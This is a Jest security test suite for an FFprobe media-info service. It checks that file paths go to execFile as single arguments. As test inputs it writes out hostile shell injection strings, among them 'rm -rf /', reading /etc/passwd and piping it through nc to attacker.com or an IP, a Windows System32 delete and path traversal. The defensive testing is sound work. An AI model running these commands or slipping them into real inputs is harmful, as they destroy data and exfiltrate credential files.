import { jest } from '@jest/globals';
import type { ExecFileException } from 'child_process';

/**
 * Security Tests for FFprobe Service
 *
 * These tests verify that the command injection fix (execFile vs exec) properly
 * prevents shell metacharacter exploitation.
 */

// Define the return type for execFile promise
interface ExecFileResult {
  stdout: string;
  stderr: string;
}

// Create a mock that will be returned by promisify
const mockExecFilePromise = jest.fn<(file: string, args: string[]) => Promise<ExecFileResult>>();

// Mock the entire child_process and util modules before importing the service
jest.unstable_mockModule('child_process', () => ({
  execFile: jest.fn(),
}));

jest.unstable_mockModule('util', () => ({
  promisify: jest.fn(() => mockExecFilePromise),
}));

// Now import the service after mocking
const { extractMediaInfo } = await import('../../src/services/media/ffprobeService.js');
const errors = await import('../../src/errors/index.js');
const ProcessError = errors.ProcessError;

describe('FFprobeService Security Tests', () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  describe('Command Injection Prevention', () => {
    it('should use execFile instead of exec to prevent shell interpretation', async () => {
      // Mock successful FFprobe response
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const filePath = '/movies/Test Movie (2023)/movie.mkv';
      await extractMediaInfo(filePath);

      // Verify execFile was called (not exec)
      expect(mockExecFilePromise).toHaveBeenCalledTimes(1);

      // Verify it was called with the correct executable and arguments
      expect(mockExecFilePromise).toHaveBeenCalledWith(
        'ffprobe',
        expect.any(Array)
      );
    });

    it('should pass filename as separate argument, not concatenated string', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const filePath = '/movies/Test Movie (2023)/movie.mkv';
      await extractMediaInfo(filePath);

      // Verify arguments are passed as an array with the file path as the last element
      const callArgs = mockExecFilePromise.mock.calls[0];
      expect(callArgs[0]).toBe('ffprobe');
      expect(Array.isArray(callArgs[1])).toBe(true);

      const argsArray = callArgs[1] as string[];
      expect(argsArray).toEqual([
        '-v',
        'quiet',
        '-print_format',
        'json',
        '-show_format',
        '-show_streams',
        filePath,
      ]);
    });

    it('should handle semicolon injection attempt safely', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      // Filename with command injection attempt
      const maliciousPath = '/movies/video; rm -rf /';
      await extractMediaInfo(maliciousPath);

      // Verify the malicious path is passed as a single argument
      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // The last argument should be the exact malicious path (not split or interpreted)
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);

      // Verify it's not being split into multiple arguments
      expect(argsArray).not.toContain('rm');
      expect(argsArray).not.toContain('-rf');
      expect(argsArray.filter(arg => arg === '/')).toHaveLength(0);
    });

    it('should handle AND operator injection attempt safely', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = '/movies/video && cat /etc/passwd';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // Verify the entire malicious path is treated as a single filename
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
      expect(argsArray).not.toContain('cat');
      expect(argsArray).not.toContain('/etc/passwd');
    });

    it('should handle pipe injection attempt safely', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = '/movies/video | nc attacker.com 1234';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // Verify pipe and subsequent command are part of the filename
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
      expect(argsArray).not.toContain('nc');
      expect(argsArray).not.toContain('attacker.com');
      expect(argsArray).not.toContain('1234');
    });

    it('should handle command substitution with $() safely', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = '/movies/video$(whoami).mkv';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // Verify command substitution is not executed
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
      expect(argsArray).not.toContain('whoami');
    });

    it('should handle backtick command substitution safely', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = '/movies/video`id`.mkv';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // Verify backtick substitution is not executed
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
      expect(argsArray).not.toContain('id');
    });

    it('should handle newline injection attempt safely', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = '/movies/video\nrm -rf /';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // Newline should be part of the filename, not a command separator
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
    });

    it('should handle dollar sign variable expansion safely', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = '/movies/$HOME/video.mkv';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // $HOME should not be expanded
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
    });

    it('should handle redirection operators safely', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = '/movies/video > /tmp/evil.sh';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // Redirection should be part of filename
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
      expect(argsArray).not.toContain('/tmp/evil.sh');
    });

    it('should handle multiple injection vectors in one filename', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = '/movies/video; cat /etc/passwd | nc 1.2.3.4 9999 && rm -rf /';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // Entire malicious string should be a single argument
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
      expect(argsArray.length).toBe(7); // 6 ffprobe args + 1 file path

      // No shell commands should be separate arguments
      expect(argsArray).not.toContain('cat');
      expect(argsArray).not.toContain('nc');
      expect(argsArray).not.toContain('rm');
    });
  });

  describe('FFprobe Argument Safety', () => {
    it('should pass all FFprobe flags as separate array elements', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      await extractMediaInfo('/movies/video.mkv');

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // Verify each flag is a separate element
      expect(argsArray[0]).toBe('-v');
      expect(argsArray[1]).toBe('quiet');
      expect(argsArray[2]).toBe('-print_format');
      expect(argsArray[3]).toBe('json');
      expect(argsArray[4]).toBe('-show_format');
      expect(argsArray[5]).toBe('-show_streams');

      // Verify no concatenated strings like '-v quiet' or '-print_format json'
      expect(argsArray).not.toContain('-v quiet');
      expect(argsArray).not.toContain('-print_format json');
    });

    it('should not allow flag injection through filename', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      // Attempt to inject additional FFprobe flags
      const maliciousPath = '/movies/video.mkv -f lavfi -i testsrc';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // The malicious path should be treated as a single filename
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);

      // Verify the injected flags are not separate arguments
      const flagsCount = argsArray.filter(arg => arg === '-f' || arg === '-i').length;
      expect(flagsCount).toBe(0);
    });
  });

  describe('Error Handling', () => {
    it('should throw ProcessError when FFprobe execution fails', async () => {
      const mockError = new Error('FFprobe not found') as ExecFileException;
      mockError.code = 127;

      mockExecFilePromise.mockRejectedValue(mockError);

      await expect(extractMediaInfo('/movies/video.mkv')).rejects.toThrow(ProcessError);
    });

    it('should include original file path in error metadata', async () => {
      const mockError = new Error('FFprobe failed') as ExecFileException;
      mockError.code = 1;

      mockExecFilePromise.mockRejectedValue(mockError);

      const testPath = '/movies/Test Movie/video.mkv';

      try {
        await extractMediaInfo(testPath);
        fail('Should have thrown ProcessError');
      } catch (error) {
        expect(error).toBeInstanceOf(ProcessError);
        const processError = error as InstanceType<typeof ProcessError>;
        expect(processError.context?.metadata?.filePath).toBe(testPath);
      }
    });

    it('should handle malicious path in error safely', async () => {
      const mockError = new Error('FFprobe failed') as ExecFileException;
      mockError.code = 1;

      mockExecFilePromise.mockRejectedValue(mockError);

      const maliciousPath = '/movies/video; rm -rf /';

      try {
        await extractMediaInfo(maliciousPath);
        fail('Should have thrown ProcessError');
      } catch (error) {
        expect(error).toBeInstanceOf(ProcessError);
        const processError = error as InstanceType<typeof ProcessError>;

        // Verify malicious path is in metadata but not executed
        expect(processError.context?.metadata?.filePath).toBe(maliciousPath);
      }
    });
  });

  describe('Media Info Extraction', () => {
    it('should successfully extract media info from valid FFprobe output', async () => {
      const mockStdout = JSON.stringify({
        format: {
          duration: '7200.5',
          size: '1073741824',
        },
        streams: [
          {
            index: 0,
            codec_type: 'video',
            codec_name: 'h264',
            codec_long_name: 'H.264 / AVC / MPEG-4 AVC / MPEG-4 part 10',
            width: 1920,
            height: 1080,
            r_frame_rate: '24000/1001',
            bit_rate: '5000000',
          },
          {
            index: 1,
            codec_type: 'audio',
            codec_name: 'aac',
            codec_long_name: 'AAC (Advanced Audio Coding)',
            channels: 2,
            channel_layout: 'stereo',
            sample_rate: '48000',
            bit_rate: '192000',
          },
        ],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const result = await extractMediaInfo('/movies/video.mkv');

      expect(result.duration).toBe(7200.5);
      expect(result.fileSize).toBe(1073741824);
      expect(result.videoStreams).toHaveLength(1);
      expect(result.audioStreams).toHaveLength(1);
      expect(result.videoStreams[0].codecName).toBe('h264');
      expect(result.audioStreams[0].codecName).toBe('aac');
    });

    it('should handle FFprobe output with special characters in metadata', async () => {
      const mockStdout = JSON.stringify({
        format: {
          duration: '120.5',
          size: '1024000',
        },
        streams: [
          {
            index: 0,
            codec_type: 'video',
            codec_name: 'h264',
            tags: {
              title: 'Test; rm -rf /',
              language: 'eng',
            },
          },
        ],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const result = await extractMediaInfo('/movies/video.mkv');

      // Verify malicious content in metadata is stored safely
      expect(result.videoStreams[0].title).toBe('Test; rm -rf /');
    });
  });

  describe('Path Traversal Prevention', () => {
    it('should handle path traversal attempts in filename', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = '/movies/../../etc/passwd';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // Verify the path is passed as-is (execFile doesn't resolve paths)
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
    });

    it('should handle null byte injection safely', async () => {
      const maliciousPath = '/movies/video.mkv\0.txt';

      // Simulate Node.js rejecting null bytes in exec arguments
      const nullByteError = new TypeError(
        `The argument 'args[6]' must be a string without null bytes. Received '${maliciousPath.replace('\0', '\\x00')}'`
      );
      mockExecFilePromise.mockRejectedValue(nullByteError);

      // This should throw because Node.js rejects null bytes in paths
      await expect(extractMediaInfo(maliciousPath)).rejects.toThrow();
    });
  });

  describe('Windows-Specific Attacks', () => {
    it('should handle Windows command injection attempts', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = 'C:\\movies\\video & del C:\\Windows\\System32';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // Verify Windows command injection is treated as filename
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
      expect(argsArray).not.toContain('del');
    });

    it('should handle UNC path injection attempts', async () => {
      const mockStdout = JSON.stringify({
        format: { duration: '120.5', size: '1024000' },
        streams: [],
      });

      mockExecFilePromise.mockResolvedValue({ stdout: mockStdout, stderr: '' });

      const maliciousPath = '\\\\attacker.com\\share\\malware.exe';
      await extractMediaInfo(maliciousPath);

      const callArgs = mockExecFilePromise.mock.calls[0];
      const argsArray = callArgs[1] as string[];

      // UNC path should be treated as a file path argument
      expect(argsArray[argsArray.length - 1]).toBe(maliciousPath);
    });
  });
});
